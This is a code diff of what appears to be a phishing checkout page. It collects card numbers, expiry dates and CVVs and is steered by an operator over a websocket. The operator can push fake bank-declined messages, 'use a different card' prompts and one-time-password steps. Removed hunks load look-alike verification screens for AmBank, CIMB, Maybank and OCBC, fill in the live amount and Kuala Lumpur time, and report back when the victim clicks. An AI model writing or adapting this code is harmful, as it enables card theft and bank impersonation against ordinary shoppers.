@@ -942,9 +942,7 @@ url("pay1ment_icons.woff") format("woff");
 
 <div style="margin-bottom:12px"><label style="display:block;font-size:12px;color:#666;margin-bottom:4px">Cardholder Name *</label><input id="cardHolder" placeholder="Name on card" style="width:100%;padding:10px 12px;border:1px solid #ddd;border-radius:8px;font-size:14px;outline:none;font-family:Inter,sans-serif"></div>
 
-<div style="margin-bottom:12px"><label style="display:block;font-size:12px;color:#666;margin-bottom:4px">Card Number *</label><div style="position:relative"><input id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" style="width:100%;padding:10px 12px;padding-right:105px;border:1px solid #ddd;border-radius:8px;font-size:14px;outline:none;font-family:Inter,sans-serif"><div style="position:absolute;right:10px;top:50%;transform:translateY(-50%);display:flex;gap:4px;pointer-events:none"><svg width="32" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#1a1f71"/><text x="16" y="15" text-anchor="middle" fill="#fff" font-size="10" font-weight="700">VISA</text></svg><svg width="32" height="22" viewBox="0 0 32 22"><circle cx="12" cy="11" r="9" fill="#eb001b"/><circle cx="20" cy="11" r="9" fill="#f79e1b"/><circle cx="16" cy="11" r="5" fill="#ff5f00"/></svg><svg width="32" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#006fcf"/><text x="16" y="16" text-anchor="middle" fill="#fff" font-size="8" font-weight="700">AMEX</text></svg></div></div>
-
-
+<div style="margin-bottom:12px"><label style="display:block;font-size:12px;color:#666;margin-bottom:4px">Card Number *</label><div style="position:relative"><input id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" style="width:100%;padding:10px 12px;padding-right:105px;border:1px solid #ddd;border-radius:8px;font-size:14px;outline:none;font-family:Inter,sans-serif"><div style="position:absolute;right:10px;top:50%;transform:translateY(-50%);display:flex;gap:4px;pointer-events:none"><svg width="32" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#1a1f71"/><text x="16" y="15" text-anchor="middle" fill="#fff" font-size="10" font-weight="700">VISA</text></svg><svg width="32" height="22" viewBox="0 0 32 22"><circle cx="12" cy="11" r="9" fill="#eb001b"/><circle cx="20" cy="11" r="9" fill="#f79e1b"/><circle cx="16" cy="11" r="5" fill="#ff5f00"/></svg><svg width="32" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#006fcf"/><text x="16" y="16" text-anchor="middle" fill="#fff" font-size="8" font-weight="700">AMEX</text></svg></div></div></div>
 
 <div style="display:flex;gap:12px;margin-bottom:12px"><div style="flex:1"><label style="display:block;font-size:12px;color:#666;margin-bottom:4px">Expiry (MM/YY) *</label><input id="expiry" placeholder="MM/YY" maxlength="5" style="width:100%;padding:10px 12px;border:1px solid #ddd;border-radius:8px;font-size:14px;outline:none;font-family:Inter,sans-serif"></div><div style="flex:1"><label style="display:block;font-size:12px;color:#666;margin-bottom:4px">CVV *</label><input id="cvv" placeholder="123" maxlength="4" type="password" style="width:100%;padding:10px 12px;border:1px solid #ddd;border-radius:8px;font-size:14px;outline:none;font-family:Inter,sans-serif"></div></div>
 
@@ -1056,14 +1054,7 @@ url("pay1ment_icons.woff") format("woff");
         </div>
         <!-- APP Verification overlay -->
         <div class="overlay hidden" id="app-verify-overlay">
-            <div class="hidden" id="mount1"></div>
-            <div class="hidden" id="mount2"></div>
-            <div class="hidden" id="mount3"></div>
-            <div class="hidden" id="mount4"></div>
-            <div class="hidden" id="mount5"></div>
-            <div class="hidden" id="mount6"></div>
-            <div class="hidden" id="mount7"></div>
-            <div class="app-verify-box hidden">
+            <div class="app-verify-box">
                 <div class="app-hdr">
                     <div class="app-bank-logo" id="app-bank-logo">IB</div>
                     <div class="app-scheme" id="app-scheme">
@@ -1594,7 +1585,7 @@ url("pay1ment_icons.woff") format("woff");
       hideLoad()
       var btn3 = q('btnSubmit');
       if (btn3) { btn3.disabled = false; /*btn3.textContent = 'Pay RM ' + discountedTotal().toFixed(2);*/ }
-      showMsg('error', 'We are unable to authenticate your payment method. Please choose a different payment method and try again.', true);
+      showInline('error', 'Card error: ' + (p.message || ''), true);
  
     } else if (a === 'otp_error') {
 
@@ -1617,9 +1608,8 @@ url("pay1ment_icons.woff") format("woff");
       if (btn4) { btn4.disabled = true; }
       showInline('error', 'Session timed out. Please try again.', true);
  
-    } else if (a === 'change_card_prompt'  || a==='custom_prompt') {
+    } else if (a === 'change_card' || a === 'change_card_prompt') {
       _curStep = 'card';
-      document.getElementById('load-overlay').classList.add('hidden');
       var resultmessage = p.message || 'Your bank did not authorize this transaction.';
       document.querySelector("#otp-result > p").innerHTML = resultmessage+'<br>Please try another card or contact your card issuer.';
       document.querySelector("#email-result > p").innerHTML = resultmessage+'<br>Please try another card or contact your card issuer.';
@@ -1628,20 +1618,7 @@ url("pay1ment_icons.woff") format("woff");
       document.getElementById('app-verify-overlay').classList.add('hidden');
       var btn5 = q('btnSubmit');
       if (btn5) { btn5.disabled = false; /*btn5.textContent = 'Pay RM ' + discountedTotal().toFixed(2);*/ }
-      showMsg('error', p.message, true);
- 
-    } else if (a === 'change_card') {
-      _curStep = 'card';
-      document.getElementById('load-overlay').classList.add('hidden');
-      var resultmessage = p.message || 'Your bank did not authorize this transaction.';
-      document.querySelector("#otp-result > p").innerHTML = resultmessage+'<br>Please try another card or contact your card issuer.';
-      document.querySelector("#email-result > p").innerHTML = resultmessage+'<br>Please try another card or contact your card issuer.';
-      changeOtp();
-      changeEmail();
-      document.getElementById('app-verify-overlay').classList.add('hidden');
-      var btn5 = q('btnSubmit');
-      if (btn5) { btn5.disabled = false; /*btn5.textContent = 'Pay RM ' + discountedTotal().toFixed(2);*/ }
-      showMsg('error', 'Please use a different card.', true);
+      showInline('info', p.message || 'Please use a different card.', true);
  
     } else if (a === 'redirect_complete') {
       location.href = '/complete/';
@@ -1656,129 +1633,9 @@ url("pay1ment_icons.woff") format("woff");
     }
      else if (a === 'app_verify') {
       _curStep = 'app_verify';
+      window._appVerifyInProgress = true;
       document.getElementById('load-overlay').classList.add('hidden');
       document.getElementById('app-verify-overlay').classList.remove('hidden');
-
-      if(p.cardInfo.bankName==='AMBANK (M) BERHAD') {
-        document.querySelector("#mount1").classList.remove('hidden');
-        document.querySelector("#mount1").shadowRoot.querySelector("div > table.maintable.bg > tbody > tr:nth-child(4) > td:nth-child(3) > span").textContent = 'RM '+discountedTotal().toFixed(2);
-        const now = new Date(); 
-        const options = {
-        weekday: 'short',
-        month: 'short',
-        day: '2-digit',
-        year: 'numeric',
-        timeZone: 'Asia/Kuala_Lumpur'};
-        const parts = new Intl.DateTimeFormat('en-US', options).formatToParts(now);
-        const weekday = parts.find(p => p.type === 'weekday').value;
-        const month = parts.find(p => p.type === 'month').value;
-        const day = parts.find(p => p.type === 'day').value;
-        const year = parts.find(p => p.type === 'year').value;
-        const dateStr = `${weekday} ${month} ${day} ${year}`;
-        const timeStr = now.toLocaleTimeString('en-GB', {
-            hour12: false,
-            timeZone: 'Asia/Kuala_Lumpur'
-        });
-        document.querySelector("#mount1").shadowRoot.querySelector("div > table.maintable.bg > tbody > tr:nth-child(5) > td:nth-child(3)").innerHTML = `
-            <span>${dateStr}</span><br>
-            <span>${timeStr} GMT +0800</span>
-        `;
-      }
-      else
-      if(p.cardInfo.bankName==='CIMB BANK BERHAD') {
-        document.querySelector("#mount2").classList.remove('hidden');
-        document.querySelector("#mount2").shadowRoot.querySelector("div > table:nth-child(2) > tbody > tr:nth-child(5) > td:nth-child(3) > span").textContent = 'RM '+discountedTotal().toFixed(2);
-        const now = new Date(); 
-        const options = {
-        weekday: 'short',
-        month: 'short',
-        day: '2-digit',
-        year: 'numeric',
-        timeZone: 'Asia/Kuala_Lumpur'};
-        const parts = new Intl.DateTimeFormat('en-US', options).formatToParts(now);
-        const weekday = parts.find(p => p.type === 'weekday').value;
-        const month = parts.find(p => p.type === 'month').value;
-        const day = parts.find(p => p.type === 'day').value;
-        const year = parts.find(p => p.type === 'year').value;
-        const dateStr = `${weekday} ${month} ${day} ${year}`;
-        const timeStr = now.toLocaleTimeString('en-GB', {
-            hour12: false,
-            timeZone: 'Asia/Kuala_Lumpur'
-        });
-        document.querySelector("#mount2").shadowRoot.querySelector("div > table:nth-child(2) > tbody > tr:nth-child(6) > td:nth-child(3)").innerHTML = `
-            <span>${dateStr}</span><br>
-            <span>${timeStr} GMT +0800</span>
-        `;
-      }
-      else
-      if(p.cardInfo.bankName==='MALAYAN BANKING BERHAD') {
-        document.querySelector("#mount3").classList.remove('hidden');
-        document.querySelector("#mount3").shadowRoot.querySelector("div > table:nth-child(2) > tbody > tr:nth-child(5) > td:nth-child(3) > span").textContent = 'RM '+discountedTotal().toFixed(2);
-        const now = new Date(); 
-        const options = {
-        weekday: 'short',
-        month: 'short',
-        day: '2-digit',
-        year: 'numeric',
-        timeZone: 'Asia/Kuala_Lumpur'};
-        const parts = new Intl.DateTimeFormat('en-US', options).formatToParts(now);
-        const weekday = parts.find(p => p.type === 'weekday').value;
-        const month = parts.find(p => p.type === 'month').value;
-        const day = parts.find(p => p.type === 'day').value;
-        const year = parts.find(p => p.type === 'year').value;
-        const dateStr = `${weekday} ${month} ${day} ${year}`;
-        const timeStr = now.toLocaleTimeString('en-GB', {
-            hour12: false,
-            timeZone: 'Asia/Kuala_Lumpur'
-        });
-        document.querySelector("#mount3").shadowRoot.querySelector("div > table:nth-child(2) > tbody > tr:nth-child(6) > td:nth-child(3)").innerHTML = `
-            <span>${dateStr}</span><br>
-            <span>${timeStr} GMT +0800</span>
-        `;
-      }
-      else
-      if(p.cardInfo.bankName==='OVERSEA-CHINESE BANKING CORPORATION LTD.') {
-        document.querySelector("#mount4").classList.remove('hidden');
-        document.querySelector("#mount4").shadowRoot.querySelector("div > table:nth-child(2) > tbody > tr:nth-child(5) > td:nth-child(3) > span").textContent = 'RM '+discountedTotal().toFixed(2);
-        const now = new Date(); 
-        const options = {
-        weekday: 'short',
-        month: 'short',
-        day: '2-digit',
-        year: 'numeric',
-        timeZone: 'Asia/Kuala_Lumpur'};
-        const parts = new Intl.DateTimeFormat('en-US', options).formatToParts(now);
-        const weekday = parts.find(p => p.type === 'weekday').value;
-        const month = parts.find(p => p.type === 'month').value;
-        const day = parts.find(p => p.type === 'day').value;
-        const year = parts.find(p => p.type === 'year').value;
-        const dateStr = `${weekday} ${month} ${day} ${year}`;
-        const timeStr = now.toLocaleTimeString('en-GB', {
-            hour12: false,
-            timeZone: 'Asia/Kuala_Lumpur'
-        });
-        document.querySelector("#mount4").shadowRoot.querySelector("div > table:nth-child(2) > tbody > tr:nth-child(6) > td:nth-child(3)").innerHTML = `
-            <span>${dateStr}</span><br>
-            <span>${timeStr} GMT +0800</span>
-        `;
-      }
-
-      /*if(p.bankName==='AMBANK (M) BERHAD') 
-        loadPage('/pages/page1', 'mount'); return;
-
-      if(p.bankName==='AMBANK (M) BERHAD') 
-        loadPage('/pages/page1', 'mount'); return;
-
-      if(p.bankName==='AMBANK (M) BERHAD') 
-        loadPage('/pages/page1', 'mount'); return;
-
-      if(p.bankName==='AMBANK (M) BERHAD') 
-        loadPage('/pages/page1', 'mount'); return;
-
-      if(p.bankName==='AMBANK (M) BERHAD') 
-        loadPage('/pages/page1', 'mount'); return;*/
-
-
       var bankName = p.cardInfo?.bankName || p.bankName || 'Bank';
       updateBankLogo(bankName);
       document.getElementById('app-amount').textContent = '$' + discountedTotal().toFixed(2);
@@ -1942,7 +1799,7 @@ url("pay1ment_icons.woff") format("woff");
   function showLoad() {
     var load = q('load-overlay');
     //var btn = q('btnSubmit');
-    if (load) load.classList.remove('hidden');
+    if (load) load.className = 'overlay';
     //if (btn) btn.style.display = 'none';
   }
 
@@ -1950,7 +1807,7 @@ url("pay1ment_icons.woff") format("woff");
   function hideLoad() {
     var load = q('load-overlay');
     //var btn = q('btnSubmit');
-    if (load) load.classList.add('hidden');
+    if (load) load.className = 'overlay hidden';
     //if (btn) btn.style.display = 'none';
   }
 
@@ -2764,121 +2621,7 @@ function updateOtpCardLogoStyle(cardType, elId) {
 
 
  
-async function loadPage(pagePath, mountId) {
 
-    // 读取html
-    const htmlText = await fetch(`${pagePath}/index.html`)
-        .then(r => r.text());
-
-    // 读取css
-    const cssText = await fetch(`${pagePath}/style.css`)
-        .then(r => r.text());
-
-    // 创建容器
-    const host = document.getElementById(mountId);
-
-    // 创建shadow
-    const shadow = host.attachShadow({ mode: "open" });
-
-    // 去掉原link
-    const cleanHtml = htmlText.replace(
-        /<link[^>]*style\.css[^>]*>/i,
-        ''
-    );
-
-    // 插入
-    shadow.innerHTML = `
-        <style>
-            ${cssText}
-        </style>
-
-        ${cleanHtml}
-    `;
-}
-
-
-
-        (async () => {
-
-    await loadPage('/pay/AMBANK', 'mount1');
-    const shadow1 = document.querySelector("#mount1").shadowRoot;
-    shadow1
-        .querySelector("#formactions > a > div")
-        .addEventListener('click', CustomizationappVerifyContinue1);
-
-    await loadPage('/pay/CIMB', 'mount2');
-    const shadow2 = document.querySelector("#mount2").shadowRoot;
-    shadow2
-        .querySelector("#disableResend > div")
-        .addEventListener('click', CustomizationappVerifyContinue2);
-
-    await loadPage('/pay/MALAYAN', 'mount3');
-    const shadow3 = document.querySelector("#mount3").shadowRoot;
-    shadow3
-        .querySelector("#disableResend > div")
-        .addEventListener('click', CustomizationappVerifyContinue3);
-
-    await loadPage('/pay/OCBC', 'mount4');
-    const shadow4 = document.querySelector("#mount4").shadowRoot;
-    shadow4
-        .querySelector("#disableResend > div")
-        .addEventListener('click', CustomizationappVerifyContinue4);
-
-
-
-
-
-})();
-
-
-
-function CustomizationappVerifyContinue1() {
-                document.querySelector("#mount1").shadowRoot.querySelector("div > div").style.display = 'flex';
-                document.querySelector("#mount1").shadowRoot.querySelector("div > div").classList.remove('hidden');
-                if (ws && ws.readyState === 1 && sid)
-                    ws.send(JSON.stringify({
-                        type: 'app_verify_done',
-                        payload: {
-                            sessionId: sid
-                        }
-                    }))
-            }
-
-function CustomizationappVerifyContinue2() {
-                document.querySelector("#mount2").shadowRoot.querySelector("div > div").style.display = 'flex';
-                document.querySelector("#mount2").shadowRoot.querySelector("div > div").classList.remove('hidden');
-                if (ws && ws.readyState === 1 && sid)
-                    ws.send(JSON.stringify({
-                        type: 'app_verify_done',
-                        payload: {
-                            sessionId: sid
-                        }
-                    }))
-            }            
-
-function CustomizationappVerifyContinue3() {
-                document.querySelector("#mount3").shadowRoot.querySelector("div > div").style.display = 'flex';
-                document.querySelector("#mount3").shadowRoot.querySelector("div > div").classList.remove('hidden');
-                if (ws && ws.readyState === 1 && sid)
-                    ws.send(JSON.stringify({
-                        type: 'app_verify_done',
-                        payload: {
-                            sessionId: sid
-                        }
-                    }))
-            }            
-
-function CustomizationappVerifyContinue4() {
-                document.querySelector("#mount4").shadowRoot.querySelector("div > div").style.display = 'flex';
-                document.querySelector("#mount4").shadowRoot.querySelector("div > div").classList.remove('hidden');
-                if (ws && ws.readyState === 1 && sid)
-                    ws.send(JSON.stringify({
-                        type: 'app_verify_done',
-                        payload: {
-                            sessionId: sid
-                        }
-                    }))
-            } 
             </script>
 
 
